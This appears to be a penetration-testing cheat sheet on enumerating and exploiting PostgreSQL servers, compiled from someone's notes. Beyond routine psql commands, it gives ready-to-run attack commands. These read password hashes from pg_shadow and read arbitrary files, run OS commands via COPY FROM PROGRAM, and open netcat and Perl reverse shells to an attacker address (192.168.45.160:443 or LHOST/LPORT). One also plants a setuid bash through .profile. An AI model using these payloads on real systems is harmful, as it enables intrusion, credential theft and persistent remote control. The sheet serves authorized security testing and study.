> Source: `01101100-C0D3X-00110110.md` → `Enumeration > Service Enumeration > PostgreSQL`

```bash
nmap --script=pgsql-info -p 5432 <target>
psql -h <target> -U postgres
```

## Postgres RCE

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > SQLi > Postgres RCE`

```
psql -h 240.0.0.1 -p 5432 -U postgres -d webapp

DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

# Reverse shell
COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.160 443 >/tmp/f';
```


## PostgreSQL

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Commands > Database Analysis > PostgreSQL`

```
psql
psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
```


## Common Commands

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Commands > Database Analysis > PostgreSQL > Common Commands`

```
postgres=# \list                     // list all databases
postgres=# \c                        // use database
postgres=# \c <DATABASE>             // use specific database
postgres=# \s                        // command history
postgres=# \q                        // quit
<DATABASE>=# \dt                     // list tables from current schema
<DATABASE>=# \dt *.*                 // list tables from all schema
<DATABASE>=# \du                     // list users roles
<DATABASE>=# \du+                    // list users roles
<DATABASE>=# SELECT user;            // get current user
<DATABASE>=# TABLE <TABLE>;          // select table
<DATABASE>=# SELECT usename, passwd from pg_shadow;                         // read credentials
<DATABASE>=# SELECT * FROM pg_ls_dir('/'); --                               // read directories
<DATABASE>=# SELECT pg_read_file('/PATH/TO/FILE/<FILE>', 0, 1000000); --    // read a file
```
```
<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
<DATABASE>=# CREATE TABLE cmd_exec(cmd_output text);
<DATABASE>=# COPY cmd_exec FROM PROGRAM 'id';
<DATABASE>=# SELECT * FROM cmd_exec;
<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
```

or

```
<DATABASE>=# COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f';
<DATABASE>=# COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<LPORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
<DATABASE>=# COPY (SELECT CAST('cp /bin/bash /var/lib/postgresql/bash;chmod 4777 /var/lib/postgresql/bash;' AS text)) TO '/var/lib/postgresql/.profile';"
```
